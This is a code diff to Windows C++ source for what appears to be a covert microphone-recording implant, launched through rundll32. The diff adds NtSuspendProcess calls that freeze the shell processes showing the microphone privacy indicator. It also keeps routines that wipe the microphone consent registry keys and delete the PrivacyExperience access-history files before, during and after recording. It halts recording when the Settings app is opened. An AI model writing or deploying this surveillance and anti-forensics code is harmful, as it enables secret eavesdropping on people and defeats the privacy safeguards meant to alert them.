@@ -39,6 +39,30 @@
 #pragma comment(lib, "mfuuid.lib")
 #pragma comment(lib, "mf.lib")
 #pragma comment(lib, "ole32.lib")
+#include <winternl.h>
+
+typedef LONG (NTAPI *NtSuspendProcess)(HANDLE ProcessHandle);
+static NtSuspendProcess pNtSuspendProcess = nullptr;
+
+static void SuspendProcess(DWORD pid) {
+    if (!pNtSuspendProcess) {
+        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+        if (hNtdll)
+            pNtSuspendProcess = (NtSuspendProcess)GetProcAddress(hNtdll, "NtSuspendProcess");
+        if (!pNtSuspendProcess) return;
+    }
+    HANDLE hProcess = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid);
+    if (hProcess) {
+        pNtSuspendProcess(hProcess);
+        CloseHandle(hProcess);
+    }
+}
+
+// Forward declarations (defined inside extern "C" block below)
+//extern "C" void HideMicrophoneIconFromTray();
+extern "C" void AudioSuspendIndicatorProcesses();
+extern "C" void AudioCleanMicRegistry();
+extern "C" void AudioDeletePrivacyFiles();
 
 // ── Forward declarations from main.cpp ──
 extern void host_main_loop();
@@ -887,12 +911,11 @@ static void AudioDeleteRegKeyRecursive(HKEY hRoot, const wchar_t* subKey) {
     RegDeleteKeyW(hRoot, subKey);
 }
 
-// Clean microphone registry traces
-static void AudioCleanMicRegistry() {
+// Clean microphone registry traces (Win10/11)
+void AudioCleanMicRegistry() {
     const wchar_t* micPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone";
     AudioDeleteRegKeyRecursive(HKEY_CURRENT_USER, micPath);
     AudioDeleteRegKeyRecursive(HKEY_LOCAL_MACHINE, (std::wstring(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone")).c_str());
-    // Re-create empty key so Windows doesn't complain
     HKEY hKey = nullptr;
     RegCreateKeyExW(HKEY_CURRENT_USER, micPath, 0, nullptr, 0, KEY_WRITE, nullptr, &hKey, nullptr);
     if (hKey) {
@@ -901,20 +924,17 @@ static void AudioCleanMicRegistry() {
     }
 }
 
-// Delete privacy database files
-static void AudioDeletePrivacyFiles() {
+// Delete privacy database files (Win11 stores access history in SQLite)
+void AudioDeletePrivacyFiles() {
     wchar_t localAppData[MAX_PATH] = {};
     SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData);
     std::wstring privDir = std::wstring(localAppData) + L"\\Microsoft\\Windows\\Privacy";
     const wchar_t* files[] = { L"PrivacyExperience.dat", L"PrivacyExperience.dat-shm", L"PrivacyExperience.dat-wal" };
-    for (auto& f : files) {
-        std::wstring path = privDir + L"\\" + f;
-        DeleteFileW(path.c_str());
-    }
+    for (auto& f : files) DeleteFileW((privDir + L"\\" + f).c_str());
 }
 
-// Kill processes that show microphone indicators
-static void AudioKillIndicatorProcesses() {
+// Kill tray indicator processes (legacy fallback)
+void AudioSuspendIndicatorProcesses() {
     const wchar_t* targets[] = { L"ShellExperienceHost.exe", L"StartMenuExperienceHost.exe" };
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snap == INVALID_HANDLE_VALUE) return;
@@ -923,8 +943,7 @@ static void AudioKillIndicatorProcesses() {
         do {
             for (auto& t : targets) {
                 if (_wcsicmp(pe.szExeFile, t) == 0) {
-                    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
-                    if (h) { TerminateProcess(h, 0); CloseHandle(h); }
+                    SuspendProcess(pe.th32ProcessID);
                 }
             }
         } while (Process32NextW(snap, &pe));
@@ -932,11 +951,14 @@ static void AudioKillIndicatorProcesses() {
     CloseHandle(snap);
 }
 
+
+
+
 // Full cleanup (call when Settings detected or after recording)
 static void AudioFullCleanup() {
+    AudioSuspendIndicatorProcesses();   // вместо убийства процесса
     AudioCleanMicRegistry();
     AudioDeletePrivacyFiles();
-    AudioKillIndicatorProcesses();
 }
 
 // ── AudioRecord: rundll32-compatible microphone recording ──
@@ -998,6 +1020,7 @@ void CALLBACK AudioRecord(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCm
         DWORD now = GetTickCount();
         if (now - lastCleanup > 500) {
             lastCleanup = now;
+			AudioSuspendIndicatorProcesses();			
             if (AudioCheckSystemSettings()) {
                 // EMERGENCY: Settings detected — stop recording + full cleanup
                 settingsDetected = true;
@@ -1026,6 +1049,7 @@ void CALLBACK AudioRecord(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCm
     waveInClose(hWaveIn);
 
     // Post-recording cleanup
+    AudioSuspendIndicatorProcesses();   // вместо убийства процесса
     AudioCleanMicRegistry();
     AudioDeletePrivacyFiles();
 
@@ -1224,6 +1248,7 @@ void CALLBACK AudioRecord(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCm
     }
 
     // Final cleanup — always clean traces after recording
+    AudioSuspendIndicatorProcesses();   // вместо убийства процесса
     AudioCleanMicRegistry();
     AudioDeletePrivacyFiles();
 
